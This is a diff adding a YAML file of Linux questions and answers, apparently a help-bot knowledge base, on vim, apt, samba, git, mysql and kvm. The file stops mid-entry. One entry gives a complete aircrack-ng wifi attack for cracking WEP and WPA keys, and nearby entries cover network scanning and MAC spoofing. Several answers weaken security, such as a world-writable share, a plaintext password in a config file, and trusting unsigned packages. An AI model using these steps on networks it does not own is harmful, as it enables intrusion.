@@ -1,0 +1,1393 @@
+# Linux question & answers
+
+tag:
+  - klg
+
+QA:
+
+- que: 
+  - install ubuntu dose not respond
+  - can not install ubuntu
+  ans:
+  - At startup selection screen, press F6, then unselect all the fork options.
+
+- que: 
+  - how to modify screen brightness
+  - how to change screen backlight
+  ans:
+  - xbacklight -set 40
+
+- que:
+  - how to over the wall by firefox
+  - how to over the wall with firefox
+  ans: |
+   - sudo apt install openssh-server
+   - Install Firefox plugin "autoproxy", the option is: "default proxy: ssh -D"
+   - Goto http://www.cjb.net/cgi-bin/shell.cgi?action=signup to register a ssh account
+   - ssh -v -CD 7070 username@216.194.70.6 "select yes if ask"
+   - Click the "Fu" button to Green and start!
+
+- que:
+  - linux chinese garbled
+  ans:
+  - iconv -f gb2312 -t utf-8 xxx.txt> xxx.tzt
+
+- que:
+  - unzip garbled
+  ans:
+  - unzip -O CP936 xxx.zip
+
+- que:
+  - filename garbled
+  - linux filename garbled
+  - file name garbled
+  - linux file name garbled
+  ans: |
+   - convmv -r -f utf8 -t iso88591 * --notest --nosmart
+   - convmv -r -f gbk -t utf8 * --notest --nosmart
+
+- que:
+  - how to modify user name
+  - how to change user name
+  - how to change linux user name
+  ans: |
+   - Edit 3 files, replace the name in the file
+   - sudo vi /etc/passwd
+   - sudo vi /etc/shadow
+   - sudo vi /etc/group
+   - Rename the home folder
+   - Reboot
+
+- que:
+  - how to tar
+  - how to compress
+  ans:
+  - tar -jcvf xxx.tar.bz2 filename
+
+- que:
+  - how to unzip
+  - how to untar
+  - how to uncompress
+  ans: |
+   - tar xf
+   - unrar e
+   - unzip
+   - 7z (p7zip-full)
+
+- que:
+  - how to config samba
+  - how to install samba
+  ans: |
+   - sudo apt install samba smbfs
+   - mkdir /home/yourname/share
+   - sudo chmod 777 /home/yourname/share
+   - sudo vi /etc/samba/smb.conf
+    # Add this at the last of smb.conf
+    [Share]
+    path=/home/yourname/share
+    available=yes
+    browsealbe=yes
+    public=yes
+    writable=yes
+   - sudo touch /etc/samba/smbpasswd
+   - sudo smbpasswd -a username
+   - sudo /etc/init.d/smbd restart
+   - Test if it works: smbclient -L //localhost/share
+
+- que:
+  - apt error
+  - apt source error
+  - how to deal with apt error
+  ans: |
+   - sudo rm -vf /var/lib/apt/lists/*
+   - sudo apt update
+
+- que:
+  - how to install java
+  - how to build java environment
+  ans: |
+   - sudo apt install openjdk-7-jdk
+   - Edit .bashrc, add this
+    export JAVA_HOME={your_jdk_dir}
+    export JRE_HOME=${JAVA_HOME}/jre
+    export CLASSPATH=:.${JAVA_HOME}/lib:${JRE_HOME}/lib
+    export PATH=${JAVA_HOME}/bin:$PATH
+   - At last, source .bashrc
+
+- que:
+  - how to add boot items on xubuntu
+  ans:
+  - xfce4-session-settings
+
+- que:
+  - filezilla can not upload
+  ans: |
+   - Try to refresh it.
+   - FTP space may be full.
+
+- que:
+  - how to merge audio
+  - how to combine audio
+  ans: |
+   - Install ffmpeg
+   - Write a list for splicing files
+    file '/path/to/file1'
+    file '/path/to/file2'
+    file '/path/to/file3'
+   - ffmpeg -f concat -i list -c copy output.mp3
+
+- que:
+  - ubuntu fails to start
+  - ubuntu can not start
+  ans: |
+   - Enter this commands on grub
+   - grub rescue> ls
+   - grub rescue> ls (hd0, X)/boot/grub "if it shows something, it means that linux is installed in this partition."
+   - grub rescue> set root=(hd0, X)
+   - grub rescue> set prefix=(hd0, X)/boot/grub
+   - grub rescue> insmod /boot/grub/normal.mod
+   - grub rescue> normal
+   - After enter ubuntu system, enter, 
+   - sudo update-grub
+   - sudo grub-install /dev/sda
+
+- que:
+  - how to add an environment value on ubuntu
+  - how to add an environment value on linux
+  - how to add environment value
+  ans:
+  - export PATH=/usr/local/arm/2.95.3/bin:$PATH
+
+- que:
+  - how to connect iscsi
+  ans: |
+   - First, make sure you have open-iscsi
+   - Modify /etc/iscsi/iscsid.conf
+    node.startup automatic
+   - Find iSCSI host "This step can be omitted"
+   - Login iSCSI: sudo iscsiadm --mode discovery --type sendtargets --portal 192.168.87.125 -D --login
+   - sudo fdisk -l
+   - sudo mount /dev/sdb1/mnt/iscsi
+   - If the disk is not formatted, 
+   - sudo fdisk /dev/sdb
+   - sudo mkfs.ext4 /dev/sdb1
+
+- que:
+  - how to shutdown ports
+  - how to shutdown services
+  ans: |
+   - View open ports: nmap 127.0.0.1
+   - View system services: service --status-all
+   - Close Service: sudo service xxxx stop
+
+- que:
+  - how to turn off 631 port
+  ans:
+  - sudo service cups stop
+
+- que:
+  - how to disable boot animation
+  - how to close boot animation
+  - how to turn off boot animation
+  ans: |
+   - Modify /etc/default/grub
+    GRUB_CMDLINE_LINUX_DEFAULT = ''
+   - sudo update-grub
+
+- que:
+  - how to connect to samba server
+  - how to connect to samba
+  ans: |
+   - Linux: sudo mount -t cifs //192.168.1.7/share -o username=your_PC_name, password='xxx', iocharset=utf8 ~/share
+   - Windows: \\\\IP_or_PC_name\\share
+
+- que:
+  - ubuntu can not shutdown
+  ans: |
+   - Modify /etc/default/grub
+    GRUB_CMDLINE_LINUX_DEFAULT="acpi=off apm power_off=1 quiet splash"
+   - sudo update-grub
+
+- que:
+  - how to set the default browser
+  - how to set default browser
+  ans:
+  - sudo update-alternatives --config x-www-browser
+
+- que:
+  - how to install powertop
+  ans: |
+   - sudo apt install powertop
+   - edit /etc/rc.local
+    powertop && 
+    exit 0
+
+- que:
+  - how to echo numerical scale
+  - how to echo numerical scale on command line
+  - how to display numerical scale
+  ans:
+  - echo "scale=2;1/3"|bc
+
+- que:
+  - how to take mouse area screenshot
+  ans:
+  - scrot -s
+
+- que:
+  - can not open libstdc++.so.6
+  ans: |
+   - sudo apt install libstdc++6
+   - sudo apt install lib32stdc++6
+
+- que:
+  - how to connect wep on command line
+  ans: |
+   - Method 1
+   - iwlist wlan0
+   - sudo iwconfig wlan0 essid xxx key xxx
+   - sudo dhclient wlan0 or sudo dhcpcd wlan0
+   - Method 2
+   - sudo iw dev wlan0
+   - sudo iw dev wlan0 connect xxx
+   - sudo dhclient wlan0 or sudo dhcpcd wlan0
+   - Note: If you set the essid iwconfig no response, sudo apt autoremove network-manager.
+
+- que:
+  - how to connect wpa on command line
+  ans: |
+   - sudo wpa_supplicant -i wlan0 -c/etc/wpa_supplicant/wpa_supplicant.conf
+   - sudo dhcpcd wlan0
+
+- que:
+  - how to turn off gedit automatic backup
+  - how to turn off gedit backup
+  ans:
+  - Open gedit, choose Edit->Preference->Editor, unselect "Create a backup copy of files before saving"
+
+- que:
+  - how to display star wars movie on command line
+  ans:
+  - telnet towel.blinkenlights.nl
+
+- que:
+  - how to save error log
+  ans:
+  - make>error 2>&1
+
+- que:
+  - how to install lamp environment
+  - how to install lamp
+  ans: |
+   - sudo apt install apache2 php5 libapache2-mod-php5 mysql-server libapache2-mod-auth-mysql php5-mysql
+   - sudo /etc/init.d/apache2 restart
+   - Then enter this: sudo ls /etc/apache2/mods-enabled, see if there are php5.conf and php5.load, if not, try: sudo a2enmod php5
+
+- que:
+  - how to install phpmyadmin
+  ans: |
+   - Download and unpack the phpmyadmin package.
+   - sudo cp /var/www/phpmyadmin/config.sample.inc.php /var/www/phpmyadmin/config.inc.php
+   - sudo vi /var/www/phpmyadmin/config.inc.php
+    Find "blowfish_secret" then enter any words behind it.
+   - At last install php5-mcrypt
+   - sudo apt install php5-mcrypt
+   - sudo vi /etc/php5/apache2/php.ini
+   - Modify like that:
+    extension php5-mcrypt.so
+
+- que:
+  - how to delete more than one files
+  - how to delete multiple files
+  ans:
+  - find -name "filename" -print|xargs rm
+
+- que:
+  - how to change mysql data to sqlite data
+  - how to migrate mysql data to sqlite
+  - how to move mysql data to sqlite
+  ans: |
+   - First, export the data into a sql file by mysql
+   - Then modified the file as follows, 
+   - Remove CREATE and INSERT statements, 
+   - Modify every "\'" to "''", 
+   - Edit the main key to "id INTEGER PRIMARY KEY",
+   - Edit the current time to "time TIMESTAMP NOT NULL DEFAULT (datetime('now','localtime'))", 
+   - Edit the mysql ENUM to "CHECK(xxx IN ('A','B'))", 
+   - Delete all the statements like "PRIMARY KEY ('id')", 
+   - Delete all the statements like "ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT_CHARSET=utf8", 
+   - At last, import this file into sqlite database.
+
+- que:
+  - how to use mysql
+  ans: |
+   - Start mysql server: sudo service mysql start
+   - Stop mysql server: sudo service mysql stop
+   - Change passwd: mysqladmin -u username -p
+   - Into a database: use db_name;
+   - Add database: create database db_name;
+   - Delete database: drop database db_name;
+   - Input sql files: mysql < xx.sql or mysql db_name < xx.sql
+   - Backup: mysqldump -u username -p db_name > filename
+   - Recover: mysql -u username -p db_name < filename
+   - Select the editor: pager vim
+
+- que:
+  - jre chinese garbled
+  - jre garbled
+  ans:
+  - http://blog.163.com/maaa_139/blog/static/31023991201051542321224/
+
+- que:
+  - command x86_64-linux-gnu-gcc failed with exit status 1
+  ans:
+  - sudo apt install libevent-dev
+
+- que:
+  - how to generate code documentation
+  ans: |
+   - Doxygen is a document generation tool: sudo apt install doxygen
+   - In the code directory run doxygen -g generate Doxyfile profile
+   - Doxypypy is a python tool used to make doxygen better identify
+   - git clone https://github.com/Feneric/doxypypy.git
+   - ./setup.py build
+   - sudo ./setup.py install
+   - In /usr/local/bin directory py_filter create a script
+    #!/bin/bash
+    python -m doxypypy.doxypypy -a -c $1
+   - Modify Doxyfile the FILTER_PATTERNS parameters like that: FILTER_PATTERNS *.py=py_filter
+   - Graphviz is a function-graph generation tools
+   - sudo apt install graphviz
+   - Set the Doxyfile variable to YES: CLASS_DIAGRAMS, HAVE_DOT, CALL_GRAPH, CALLER_GRAPH, DOT_PATH
+   - At last, run doxygen command to generate the diagram containing python code documentation
+   - Notes: If the contents of the document was incomplete, please see Doxyfile the EXTRACT_ prefix argument, or set EXTRACT_ALL to YES.
+
+- que:
+  - how to calibrate touch screen
+  ans: |
+   - This operation must be under the X-window environment
+   - First list all input devices, to find the touch screen id: xinput list
+   - Then use the following command to adjust the touch screen parameters to my CF-19 notebook parameters as an example,
+    xinput set-prop 9 --type=float "Coordinate Transformation Matrix" 1.118 0 -0.09 0 1.16 -0.025 0 0 1
+   - More: https://wiki.archlinux.org/index.php/Calibrating_Touchscreen
+
+- que:
+  - how to install festival
+  ans:
+  - sudo pacman festival festival-us
+
+- que:
+  - can not find /dev/dsp
+  ans: |
+   - Add the following to HOME folder, save it as .festivalrc, 
+    (Parameter.set 'Audio_Command' (aplay -q -c 1 -t raw -f s16 -r $SR $FILE))
+    (Parameter.set 'Audio_Method' Audio_Command)
+
+- que:
+  - how to install wubi
+  ans: |
+   - First install basic components: sudo pacman -S ibus ibus-table
+   - Then download ibus-table-wubi source package from the Internet, we need a data file inside the Wubi
+   - cd ibus-table-wubi/tables
+   - ibus-table-createdb -s wubi86.txt
+   - sudo cp wubi86.db /usr/share/ibus-table/tables
+   - Add the environment variable to .bashrc, 
+    export XMODIFIERS="@im=ibus"
+    export GTK_IM_MODULE=ibus
+    export QT_IM_MODULE=ibus
+   - ibus-daemon -drx
+   - Log off and then log back
+   - After ibus-setup "terminal command" add Wubi, press Ctrl+Space to launch Wubi.
+
+- que:
+  - how to install xfce4
+  ans: |
+   - sudo pacman -S xfce4
+   - startxfce4
+
+- que:
+  - how to install x-window
+  ans: |
+   - First install the basic components: sudo pacman -S xorg-server xorg-xinit xorg-utils xorg-server_utils mesa
+   - Then install window managers and terminal: sudo pacman -S xorg-twm xterm
+   - Finally, enter the original X-window by: startx
+
+- que:
+  - how to use mutt
+  - how to use mail client on terminal
+  ans: |
+   - First, install mutt: sudo pacman -S mutt
+   - Then establish .mutt folder, to store data files
+   - mkdir -p ~/.mutt/cache/headers
+   - mkdir ~/.mutt/cache/bodies
+   - touch ~/.mutt/certificates
+   - Add the following to ~/.muttrc file, modify according to their own circumstances, 
+    # A basic .muttrc for use with Gmail
+    set imap_user "your_email@gmail.com"
+    set imap_pass "your_email_password"
+    set smtp_url "smtp://your_email@smtp.gmail.com:587/"
+    set smtp_pass "your_email_password"
+    set from "your_email@gmail.com"
+    set realname "your_name"
+    set editor "vim"
+    # Basic config, you can leave this as is
+    set folder "imaps://imap.gmail.com:993"
+    set spoolfile "+INBOX"
+    set imap_check_subscribed
+    set hostname gmail.com
+    set mail_check 120
+    set timeout 300
+    set imap_keepalive 300
+    set postponed "+[GMail]/Drafts"
+    set record "+[GMail]/Sent Mail"
+    set header_cache = ~/.mutt/cache/headers
+    set message_cachedir = ~/.mutt/cache/bodies
+    set certificate_file = ~/.mutt/certificates
+    set move no
+    set include
+    set sort 'threads'
+    set sort_aux 'reverse-last-date-received'
+    set auto_tag yes
+    ignore "Authentication-Results:"
+    ignore "DomainKey-Signature:"
+    ignore "DKIM-Signature:"
+    hdr_order Date From To Cc
+    alternative_order text/plain text/html *
+    auto_view text/html
+    bind editor <Tab> complete-query
+    bind editor ^T complete
+    bind editor <space> noop
+    # Gmail-style keyboard shortcuts
+    macro index,pager y "<enter-command>unset trash\n <delete-message>" "Gmail archive message"
+    macro index,pager d "<enter-command>set trash=\"imaps://imap.googlemail.com/[GMail]/Bin\"\n <delete-message>" "Gmail delete message"
+    macro index,pager gi "<change-folder>=INBOX<enter>" "Go to inbox"
+    macro index,pager ga "<change-folder>=[Gmail]/All Mail<enter>" "Go to all mail"
+    macro index,pager gs "<change-folder>=[Gmail]/Starred<enter>" "Go to starred messages"
+    macro index,pager gd "<change-folder>=[Gmail]/Drafts<enter>" "Go to drafts"
+   - Finally, for safety, it is need to modify the configuration file permissions: sudo chmod 600 ~/.muttrc
+   - References: http: //www.cnblogs.com/wangkangluo1/archive/2012/12/28/2837300.html
+
+- que:
+  - how to install yaourt
+  ans: |
+   - First add yaourt source to /etc/pacman.conf, 
+    [archlinuxcn]
+    #The Chinese Arch Linux communities packages.
+    SigLevel Optional TrustAll
+    Server http://repo.archlinuxcn.org/$arch
+   - Then synchronize and install: sudo pacman -Syu yaourt
+
+- que:
+  - how to install sound card
+  - how to install sound card driver
+  ans: |
+   - sudo pacman -S alsa-lib alsa-tools alsa-utils alsa-oss
+   - Now you can use alsamixer command to adjust the volume 
+   - Note: Press m is for mute
+
+- que:
+  - how to check battery
+  ans: |
+   - sudo pacman -S acpi
+   - acpi power
+
+- que:
+  - publickey permission deny
+  ans:
+  - ssh-add yourkey "Not the .pub"
+
+- que:
+  - how to upload the source code to github
+  ans: |
+   - Create SSH key: ssh-keygen -C your_email_address -f ~/.ssh/id_rsa
+   - Copy the SSH key to the GitHub account, as follows:
+     After logging GitHub, click the button in the top right corner of the page gear set, enter account settings.
+     Select SSH keys, the contents of id_rsa.pub file just copied verbatim into the generated. 
+   - ssh -T git @ github.com, if successful connection, the key has been successfully imported
+   - Set git initial variables, 
+   - git config --global user.name your_name
+   - git config --global user.email your_email_address
+   - Create a new repository on GitHub
+   - Enter the local source folder, proceed as follows, 
+     git init
+     git add *
+     git commit -m "first commit"
+     git remote add origin https://github.com/your_user_name/your_repo_name.git
+     git push -u origin master
+   - After that, you only need to enter, 
+     git add *
+     git commit
+     git push
+
+- que:
+  - how to modify git editor
+  - how to change git editor
+  ans:
+  - git config --global core.editor vim
+
+- que:
+  - git can not upload
+  - git can not push
+  ans: |
+   - 1.Pull before push (Adviced)
+     git pull git@github.com:aaa/bbb.git master
+     git push -u git@github.com:aaa/bbb.git master
+   - 2.Force pushing (Danger)
+     git push -u git@github.com:aaa/bbb.git master -f
+ 
+- que:
+  - vim how to edit dos files
+  ans:
+  - :e ++ff=dos
+
+- que:
+  - vim how to delete same lines
+  ans:
+  - :g/^\(.\+\)$\n\1/d
+
+- que:
+  - vim how to get ascii
+  ans:
+  - ga
+
+- que:
+  - what is vim plugin folder mean
+  - what is the meaning of vim plugin folder
+  ans:
+  - When Vim start, it will automatically execute the plugin folder, next it will execute the ftplugin(file type plugin) folder, autoload folder is used to store big *.vim files, only execute when function calls, it is used to make vim launch faster. 
+
+- que:
+  - vim plug-in programming
+  - how to make vim plug-in
+  ans: |
+   - First, in /etc/vimrc, "filetype plugin on" should be opened
+   - Then in plugin, "au BufNewFile, BufRead, *.xxx call set filetype=AAA" to set the file type
+   - When open *.xxx file, Vim will find AAA.vim and execute it.
+   - In each *.vim file, function like filename#function() will call filename#function() in filename.vim
+   - In plugin folder, "set syntax=BBB" will call BBB.vim in syntax folder to highlight the codes.
+
+- que:
+  - vim how to flip pages
+  ans: |
+   - PageDown: Ctrl + f
+   - PageUp: Ctrl + b
+
+- que:
+  - vim how to match chinese
+  ans:
+  - '[\u4e00-\u9fa5]'
+
+- que:
+  - vim how to match english
+  ans:
+  - '[\u0020-\u007E]'
+
+- que:
+  - how to use vim historical views
+  - how to view vim history
+  ans: |
+   - Back: Ctrl + o
+   - Forward: Ctrl + i
+
+- que:
+  - how to find multiple files in vim
+  - vim how to find multiple files
+  ans:
+  - vimgrep /String/ ./*
+
+- que:
+  - vim how to fold the code
+  ans: |
+   - First, add this in vimrc, 
+    Set foldmethod=indent
+   - Then, open the fold: l
+   - Open all folds: zR
+   - Close fold: zc
+   - Close all folds: zM
+   - Expand entire function: zO
+
+- que: 
+  - vim how to access system clipboard
+  ans: |
+   - Be sure to install the vim-gnome, otherwise you can not operate the system clipboard
+   - sudo apt install vim-gnome
+   - ":reg" to see all clipboard contents in vim, the "+ is the system clipboard
+   - Use command "+y to copied to the system clipboard, use command "+p to past from the system clipboard
+
+- que:
+  - vim can not open plug-in help documentation
+  ans:
+  - ':helptags ~/.vim/doc'
+
+- que:
+  - vim how to replace words
+  ans: |
+   - Replace a to b: :%s/a/b/g
+   - Replace a to b from line n to line m: :n,ms/a/b/g
+
+- que:
+  - vimwiki how to make a new line
+  ans:
+  - Just type <br>
+
+- que:
+  - how to install vimwiki
+  ans: |
+   - Download vimwiki-xxxx.vba from http://www.vim.org/scripts/script.php?script_id=2226
+   - Open vimwiki-xxxx.vba with vim
+   - Use command so% to install it
+   - Edit/etc/vim/vimrc, add this:
+    " Vimwiki
+    let g: vimwiki_camel_case 0
+    let g: vimwiki_list [{
+    \ 'Path': '~/vimwiki/wiki',
+    \ 'Path_html': '~/vimwiki/html /',
+    \}]
+    set nocompatible
+    filetype plugin on
+    map <F5>: VimwikiAll2HTML <cr>
+
+- que:
+  - vim how to read binary file
+  ans: |
+   - vi -b filename
+   - :%!xxd
+
+- que:
+  - gvim how to init
+  ans: |
+   - set guifont=Consolas::h12:cANSI
+   - colorscheme darkblue
+   - set nobackup
+   - set encoding=utf-8
+
+- que:
+  - how to init vim
+  ans: |
+   - nmap <C-H> <C-W>h
+   - nmap <C-J> <C-W>j
+   - nmap <C-K> <C-W>k
+   - nmap <C-L> <C-W>l
+   - set tabstop=4
+   - set softtabstop=4
+   - set expandtab
+   - set shiftwidth=4
+   - set autoindent
+   - set cindent
+   - set cinoptions={2,1s,t0,n-2,p2s,(03s,=.5s,>1s,=1s,:1s
+   - imap kk <ESC>
+
+- que:
+  - how to use nmap
+  ans: |
+   - nmap -sP 192.168.1.* Lists all online equipment segment
+   - nmap -O 192.168.1.* detect operating system
+
+- que:
+  - how to change mac address
+  - how to modify mac address
+  ans: |
+   - If your net card is eth0
+   - sudo ifconfig eth0 down
+   - sudo ifconfig eth0 hw ether new_mac_address
+   - sudo ifconfig eth0 up
+
+- que:
+  - how to hack the wifi
+  - how to hack wifi
+  ans: |
+   - 1. Init
+   - First, turn on the wireless card, sudo ifconfig wlan0 up
+   - Open the card listening mode, the number 6 is the AP's working channel, sudo airmon-ng start wlan0 6
+   - Begin to crawl CAP packages, sudo airodump-ng -w filename -c 6 mon0
+   - 2. Attack
+   - First, use the conflict attack to active the target, sudo aireplay-ng -0 10 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (10 represents the count number of transmissions), After use airodump-ng you can see the package number increase quickly. You can active the target again and again to accelerate the package catching.
+   - Second, connect the camouflage client: sudo aireplay-ng -1 0 -e <ESSID> -a <AP's MAC> -h <NETCARD's MAC> mon0 (0 is for delay)
+   - Third, use fragmented packets attack to obtain PRGA: sudo aireplay-ng -5 -b <AP's MAC> -h <NETCARD's MAC> mon0 (it will create a .xor file at last)
+   - Fourth, generate an ARP package according to the .xor file: packetforge-ng -0 -a AP's MAC -h NETCARD's MAC 5 -k 255.255.255.255 -l 255.255.255.255 -y XXXX.xor -w myarp
+   - Finally, injected the ARP package to start attack: aireplay-ng -2 -r myarp -x 512 mon0 (512 is the max speed value)
+   - 3. Crack
+   - Crack WEP data: aircrack-ng -z -b <AP's MAC> filename *.cap
+   - Crack WPA data: aircrack-ng -w password.txt -b <AP's MAC> filename *.cap
+
+- que:
+  - how to deal with jlink unknow device
+  - jlink unknow device
+  ans: |
+   - Short connect the Erase pin and the TST pin longer.
+   - It is less relationship to the order of short connection.
+
+- que:
+  - how to install jlink on ubuntu
+  ans: |
+   - Warning, because of the Jlink driver auto upgradation, you must choose an old version to install, otherwise the Jlink will be broken, and you will have to reinstall the ROM!
+   - First, check if the "libusb" and "libreadline" have been installed yet.
+   - sudo cp -d libjlinkarm.so. */usr/lib
+   - ldconfig
+   - sudo cp 45-jlink.rules /etc/udev/rules.d/
+   - Make sure that you are the member of group "plugdev".
+   - Reboot the computer.
+   - Run the file "start".
+   - If there's an error like  _error libreadline.so.5 can not open shared object file_, try this, 
+   - Install the getlibs, sudo dpkg -i --force-all getlibs-all.deb
+   - Use getlibs to install the readline library, getlibs libreadline.so.5
+   - At last, make a link of libreadline.so.5 to into/lib
+
+- que:
+  - how to install sdcc on ubuntu
+  - how to install sdcc
+  ans: |
+   - sudo apt install sdcc
+   - If it does not work, try this: sudo apt install gputils gputils-common gputils-doc sdcc sdcc-doc sdcc-libraries sdcc-ucsim
+
+- que:
+  - cmu sphinx can not find libpocketsphinx.so.1
+  ans: |
+   - sudo apt install audacity
+   - libpocketsphinx.so.1 problem will arise when you start pocketsphinx_continues. It mainly due to that sphinxbase did not be added to the library path environment variable
+   - So we do: sudo vi/etc/ld.so.conf
+   - Add this, 
+    /Usr/local/lib
+    /Usr/local/lib/pkgconfig
+   - Then, sudo ldconfig
+
+- que:
+  - cmu sphinx failed to open audio device
+  - pocketsphinx_continues failed to open audio device
+  ans:
+  - sudo apt install pulseaudio
+
+- que:
+  - cmu sphinx failed to calibrate voice activity detection
+  - pocketsphinx_cintinues failed to calibrate voice activity detection
+  ans:
+  - wake up the computer
+
+- que:
+  - cmu sphinx pycapsule_getpointer called with invalid pycapsule object
+  ans:
+  - install the new version, upper than 5prealpha
+
+- que:
+  - python undefined symbol ps_update_lmset
+  ans: |
+   - sudo easy_install -m sphinxbase
+   - sudo easy_install -m pocketsphinx
+
+- que:
+  - expreval error when build coreseek
+  ans: |
+   - Edit sphinxexpr.cpp, line 1010, 1044, 1077, change T val ExprEval (this-> m_pArg, tMatch); to T val this-> ExprEval (this-> m_pArg, tMatch);
+   - Note: the config file of sphinx does not support ~/but support/home/user
+
+- que:
+  - how to install xml.vim
+  ans: |
+   - Copy xml.vim file to ~/.vim/ftplugin and then use ln -s command to create relationship between xml.vim and docbk.vim, xsl.vim, html.vim, xhtml.vim
+   - Open ftplugin in vimrc
+   - Tips, 
+   - Tag autocomplete: double-click > symbol
+   - Auto new line: double-click ; symbol in INSERT mod
+   - For more help, enter: help xml-plugin
+
+- que:
+  - bochs dlopen failed for module x file not found
+  ans:
+  - sudo apt install bochs-x
+
+- que:
+  - libbx_x.so undefined symbol xpmcreatepixmapfromdata
+  ans:
+  - added, display_library; sdl in bochsrc
+
+- que:
+  - bochs error
+  ans: |
+   - If an error of bochsrc occured, the normal way is just comment the error line.
+   - bochsrc use double quotes, not single quotes.
+   - Use bximage to make image
+   - sudo kpartx -a xxx.img mount the image
+   - sudo kpartx -d xxx.img unmount the image
+
+- que:
+  - how to mount qcow2
+  - how to mount qcow2 image
+  ans: |
+   - modprobe nbd max_part=63
+   - qemu-nbd -c /dev/nbd0 image.img
+   - mount /dev/nbd0p1 /mnt/image
+
+- que:
+  - ubuntu how to install ftp server
+  - linux how to install ftp server
+  ans:
+  - sudo apt install pure-ftpd
+
+- que:
+  - git how to revert
+  ans:
+  - git revert HEAD
+
+- que:
+  - sqlite can not import data from text
+  - sqlite can not import text
+  ans:
+  - Change text to sql file, then import.
+
+- que:
+  - how to replace string in multiple files
+  - how to replace text in multiple files
+  - how to replace in multiple files
+  - how to sed
+  ans:
+  - sed -i 's/old/new/g' filename
+
+- que:
+  - kvm how to use snapshot
+  ans: |
+   - Create snapshot: qemu-img snapshot -c snapshot_name image.qcow2
+   - Show all the snapshot: qemu-img snapshot -l image.qcow2
+   - Revert snapshot: qemu-img snapshot -a snapshot_name image.qcow2
+   - Delete snapshot: qemu-img snapshot -d snapshot_name image.qcow2
+
+- que:
+  - how to use lftp
+  ans: |
+   - Login: lftp name@site:port
+   - Command: ls, cd, get, put, mirror -R
+
+- que:
+  - ubuntu how to sudo when boot up
+  ans:
+  - Just write sudo in /etc/rc.local, cause rc.local is executed by root.
+
+- que:
+  - openwrt how to install ftp server
+  - how to install ftp server on openwrt
+  ans: |
+   - opkg update
+   - opkg install vsftpd
+
+- que:
+  - pico cms can not open sub page
+  ans: |
+   - Make sure the .htaccess file is in the main folder.
+   - sudo vi /etc/apache2/apache2.conf, change "AllowOverride None" to "AllowOverride FileInfo Options"
+
+- que:
+  - kvm how to create image
+  - how to create kvm image
+  ans:
+  - sudo qemu-img create -f qcow2  image.img 60G
+
+- que:
+  - how to install kvm
+  ans:
+  - sudo apt install qemu-kvm virt-manager bridge-utils libvirt-bin
+
+- que:
+  - how to install vnc server
+  ans: |
+   - sudo apt install vnc4server
+   - vncpasswd
+   - sudo apt install xfce4
+   - vi ~/.vnc/xstartup, annotate the old config, add new config, 
+    #x-terminal-emulator -geometry 80x24+10+10 -ls -title "$VNCDESKTOP Desktop" & 
+    #x-window-manager & 
+    sesion-manager & xfdesktop & xfce4-panel & 
+    xfce4-menu-plugin & 
+    xfsettingsd & 
+    xfconfd & 
+    xfwm4 & 
+   - Start server: vncserver :1
+   - Stop server: vncserver -kill :1
+
+- que:
+  - how to wake up remote pc
+  - how to wake up remote computer
+  ans:
+  - wakeonlan -i ip_address mac_address
+
+- que:
+  - how to mount raw
+  - how to mount raw image
+  ans: |
+   - sudo fdisk -lu image.raw, find the first start number n,
+   - echo $((n*512)), get N,
+   - sudo mount -o loop,offset=N image.raw folder/
+
+- que:
+  - can not use tab on terminal
+  - can not use tab on command line
+  - terminal can not use tab
+  - command line can not use tab
+  ans: |
+   - vi ~/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml
+   - Change line <property name="<Super>Tab" type="string" value="switch_window_key"/> to <property name="<Super>Tab" type="empty"/>
+   - sudo reboot
+
+- que:
+  - vim how to save word in regular expression
+  - vim how to save words in regular expression
+  - vim how to save string in regular expression
+  ans:
+  - :%s/\(str_1\) xxx \(str_2\)/\2 or \1/
+
+- que:
+  - vim how to remove duplicate rows
+  - vim how to delete duplicate rows
+  ans: |
+   - :sort
+   - :g/^\(.*\)$\n\1$/d
+
+- que:
+  - vim how to mismatch
+  ans:
+  - '[^(your_regex)]'
+
+- que:
+  - vim how to convert case
+  - vim how to change case
+  ans: |
+   - :%s/\(xxx\)/\L\1/g (Lower)
+   - :%s/\(xxx\)/\U\1/g (Upper)
+
+- que:
+  - how to install vim-markdown
+  ans: |
+   - Download and unzip vim-markdown
+   - Edit /etc/vimrc, add, 
+    set noncompatible
+    filetype plugin on
+
+- que:
+  - ubuntu how to remove encryption
+  - ubuntu how to remove main folder encryption
+  ans: |
+   - First, backup: sudo cp -rp /home/your_name /home/your_name.bk
+   - Then, reboot and login by root
+   - rm -rf /home/your_name
+   - mv /home/your_name.bk /home/your_name
+   - rm -rf /home/.ecryptfs
+   - rm -rf /home/your_name/.ecryptfs
+   - rm -rf /home/your_name/.Private
+   - apt autoremove ecryptfs-utils libecryptfs0
+
+- que:
+  - how to redirect the domain to github pages
+  - how to redirect domain to github
+  ans: |
+   - Add CNAME file in github main folder, the context is the domain.
+   - Then, the domain, add the github A Record,  
+    192.30.252.153
+    192.30.252.154
+
+- que:
+  - chrome how to install flash
+  - ubuntu how to install chrome flash plugin
+  - chrome how to install flash plugin on ubuntu
+  ans: |
+   - sudo apt install pepperflashplugin-nonfree
+   - sudo update-pepperflashplugin-nonfree --install
+
+- que:
+  - firefox how to install flash
+  - ubuntu how to install firefox flash plugin
+  - firefox how to install flash plugin on ubuntu
+  ans:
+  - sudo apt install flashplugin-nonfree
+
+- que:
+  - ubuntu how to rm to trash
+  ans: |
+   - sudo apt install trash-cli
+   - Edit /usr/local/bin/trash-rm, 
+    #!/bin/bash
+    # command name: trash-rm
+    shopt -s extglob
+    recursive=1
+    declare -a cmd
+    ((i = 0))
+    for f in "$@"
+    do
+    case "$f" in
+    (-*([fiIv])r*([fiIv])|-*([fiIv])R*([fiIv]))
+    tmp="${f//[rR]/}"
+    if [ -n "$tmp" ]
+    then
+    #echo "\$tmp == $tmp"
+    cmd[$i]="$tmp"
+    ((i++))
+    fi
+    recursive=0 ;;
+    (--recursive) recursive=0 ;;
+    (*)
+    if [ $recursive != 0   -a  -d "$f" ]
+    then
+    echo "skipping directory: $f"
+    continue
+    else
+    cmd[$i]="$f"
+    ((i++))
+    fi ;;
+    esac
+    done
+    trash-put "${cmd[@]}"
+   - sudo chmod +x /usr/local/bin/trash-rm
+   - Finally, add 'alias rm="trash-rm"' to ~/.bashrc
+   - source ~/.bashrc
+
+- que:
+  - can not find cdrom when install ubuntu
+  ans: |
+   - First, enter the command line when install
+   - Second, mount the U-disk
+   - Third, cd into U-disk then mount ubuntu.iso to /cdrom
+   - At last, exit and continue install.
+
+- que:
+  - kvm vnc can not connect
